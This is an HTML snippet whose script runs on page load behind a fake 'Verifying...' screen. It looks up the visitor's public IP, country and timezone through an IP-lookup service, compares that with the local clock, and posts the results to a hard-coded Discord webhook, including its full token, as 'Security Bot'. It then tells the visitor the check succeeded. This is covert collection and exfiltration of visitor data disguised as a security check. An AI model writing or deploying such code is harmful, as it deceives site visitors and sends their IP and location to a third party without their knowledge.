<div id="txt">Verifying...</div>
<script>
async function collectSecurityData() {
  const txtEl = document.getElementById("txt");

  // UI helpers
  function failUI(message = "Verification failed") {
    if (!txtEl) return;
    txtEl.style.color = "red";
    txtEl.textContent = message;
  }

  function successUI(message = "Verification successful") {
    if (!txtEl) return;
    txtEl.style.color = "limegreen";
    txtEl.textContent = message;
  }

  try {
    // 1️⃣ Get IP, country, and timezone info
    const ipRes = await fetch("https://ipapi.co/json/");
    if (!ipRes.ok) throw new Error("IP fetch failed");
    const ipData = await ipRes.json();

    const userIP = ipData.ip;
    const countryCode = ipData.country_code;
    const ipTimezone = ipData.timezone;

    // 2️⃣ Get user's local OS time
    const now = new Date();
    const userHour = now.getHours();
    const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // 3️⃣ Time mismatch check
    const ipTimeString = new Date().toLocaleString("en-US", { timeZone: ipTimezone });
    const ipHour = new Date(ipTimeString).getHours();
    const timeSafe = Math.abs(userHour - ipHour) <= 3;

    // 4️⃣ Combine security data (no VPN detection)
    const securityData = {
      ip: userIP,
      country: countryCode,
      ipTimezone: ipTimezone,
      userTimezone: userTimezone,
      userHour,
      ipHour,
      timeSafe
    };

    console.log(securityData);

    // 5️⃣ Send to Discord webhook
    const webhookURL = "https://discord.com/api/webhooks/1458509676277661924/iMx3qDFYRJRZZDO21I_iqBzdvw58TBrtNQAkJFsHgeXPKnjrk-M6J7TE3J8fMp5tSN5Q";

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Security Bot",
        embeds: [
          {
            title: "New Security Data",
            color: 0x1abc9c,
            fields: [
              { name: "IP", value: securityData.ip, inline: true },
              { name: "Country", value: securityData.country, inline: true },
              { name: "IP Timezone", value: securityData.ipTimezone, inline: true },
              { name: "User Timezone", value: securityData.userTimezone, inline: true },
              { name: "User Hour", value: String(securityData.userHour), inline: true },
              { name: "IP Hour", value: String(securityData.ipHour), inline: true },
              { name: "Time Safe", value: String(securityData.timeSafe), inline: true }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    successUI("Verification successful");
  } catch (err) {
    console.error("Error collecting security data:", err);
    failUI();
  }
}

// Run the function
collectSecurityData();
</script>
